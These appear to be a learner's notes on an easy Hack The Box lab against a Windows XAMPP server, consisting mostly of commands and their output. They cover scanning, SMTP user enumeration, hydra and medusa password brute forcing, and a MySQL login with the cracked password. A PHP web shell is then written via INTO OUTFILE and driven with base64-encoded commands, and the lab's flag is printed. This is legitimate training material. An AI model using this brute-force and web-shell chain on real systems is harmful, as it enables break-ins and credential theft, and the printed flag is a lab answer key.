## LAB EASY

nmap -sC -sV -oA nmap $TARGET --stats-every=5s

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL, SMBProgNeg: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|   SSLSessionReq: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_    Command unknown, not supported or not allowed...
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.190.124/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https?
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, FoundRows, SupportsTransactions, ODBCClient, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, LongColumnFlag, ConnectWithDatabase, Support41Auth, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Oc'5tk:~1u|/rp^feJ}[
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2023-11-15T04:22:22
|_Not valid after:  2024-05-16T04:22:22
|_ssl-date: 2023-11-16T04:25:52+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/16%Time=65559982%P=x86_64-pc-linux-gnu%r(NUL
SF:L,41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,
SF:\x2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FTP\
SF:x20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistere
SF:d\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20all
SF:owed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20n
SF:ot\x20allowed\.\.\.\r\n")%r(Help,17B,"220\x20Core\x20FTP\x20Server\x20V
SF:ersion\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n214-The\x
SF:20following\x20commands\x20are\x20implemented\r\n\x20\x20\x20\x20\x20US
SF:ER\x20\x20PASS\x20\x20ACCT\x20\x20QUIT\x20\x20PORT\x20\x20RETR\r\n\x20\
SF:x20\x20\x20\x20STOR\x20\x20DELE\x20\x20RNFR\x20\x20PWD\x20\x20\x20CWD\x
SF:20\x20\x20CDUP\r\n\x20\x20\x20\x20\x20MKD\x20\x20\x20RMD\x20\x20\x20NOO
SF:P\x20\x20TYPE\x20\x20MODE\x20\x20STRU\r\n\x20\x20\x20\x20\x20LIST\x20\x
SF:20NLST\x20\x20HELP\x20\x20FEAT\x20\x20UTF8\x20\x20PASV\r\n\x20\x20\x20\
SF:x20\x20MDTM\x20\x20REST\x20\x20PBSZ\x20\x20PROT\x20\x20OPTS\x20\x20CCC\
SF:r\n\x20\x20\x20\x20\x20XCRC\x20\x20SIZE\x20\x20MFMT\x20\x20CLNT\x20\x20
SF:ABORT\r\n214\x20\x20HELP\x20command\x20successful\r\n")%r(SSLSessionReq
SF:,77,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\
SF:x2064-bit\x20Unregistered\r\n502\x20Command\x20unknown,\x20not\x20suppo
SF:rted\x20or\x20not\x20allowed\.\.\.\r\n")%r(SMBProgNeg,41,"220\x20Core\x
SF:20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unreg
SF:istered\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows


sudo nmap -sC -sV -p 21 $TARGET

medusa -U user.list -P /usr/share/wordlists/rockyou.txt -h $TARGET -M ftp
medusa -U user.list -P password.list -h $TARGET -M ftp

hydra -L user.list -P password.list ftp://$TARGET

smtp-user-enum -M RCPT -U user.list -D inlanefreight.htb -t $TARGET

######## Scan started at Thu Nov 16 04:51:56 2023 #########
10.129.190.124: fiona@inlanefreight.htb exists

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $TARGET -M ftp

hydra -l fiona -P password.list ftp://$TARGET
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://$TARGET

nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt

nmap -p 143,993 --script imap-brute --script-args userdb=users.txt,passdb=password.list $TARGET

vi users.txt
vi password.list
nmap -p 25 --script smtp-brute --script-args userdb=users.txt,passdb=password.list $TARGET

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 334 guesses in 24 seconds, average tps: 13.3


nmap -p 25 --script smtp-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt $TARGET


hydra -l 'fiona@inlanefreight.htb' -p password.list -f $TARGET smtp

git clone https://github.com/0xZDH/o365spray
python3 o365spray/o365spray.py --validate --domain inlanefreight.htb
[2023-11-18 18:51:26,410] info | [FAILED] The following domain does not appear to be using O365: inlanefreight.htb

nc -v $TARGET 25

hydra -f -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://$TARGET -t 64
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321


telnet $TARGET 25

MAIL FROM:fiona
MAIL FROM:fiona@inlanefreight.htb
RCPT TO:fiona

EHLO inlanefreight.htb
AUTH LOGIN

echo -n 'fiona@inlanefreight.htb' |base64 -w 0;echo
ZmlvbmFAaW5sYW5lZnJlaWdodC5odGI=
echo -n '987654321' |base64 -w 0;echo
OTg3NjU0MzIx

--> Impossible to consult emails using SMTP, only possible to send new emails

mysql -u fiona -p987654321 -h $TARGET
SHOW DATABASES;
USE test;
USE test;
SHOW TABLES;
Empty set (0.017 sec)

USE performance_schema;
SELECT * FROM users;

system rm '/xampp/htdocs/webshell.php';
SELECT "<?php echo $command_decode=base64_decode($_REQUEST[0]); echo system($command_decode); ?>" INTO OUTFILE '/xampp/htdocs/webshell5.php';

http://10.129.41.144/webshell5.php?0="Y2QgYzpc"
http://10.129.41.144/webshell5.php?0=d2hvYW1pCg==
http://10.129.41.144/webshell5.php?0=Y2QgLi4gfCBkaXI=
http://10.129.41.144/webshell5.php?0=ZGlyIC93IC9wIGM6XAo=


where /R C:\ flag.txt
http://10.129.41.144/webshell5.php?0=d2hlcmUgL1IgQzpcIGZsYWcudHh0Cg==
where /R C:\ flag.txt C:\Users\Administrator\Desktop\flag.txt C:\Users\Administrator\Desktop\flag.txt

type C:\Users\Administrator\Desktop\flag.txt
http://10.129.41.144/webshell5.php?0=dHlwZSBDOlxVc2Vyc1xBZG1pbmlzdHJhdG9yXERlc2t0b3BcZmxhZy50eHQK
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}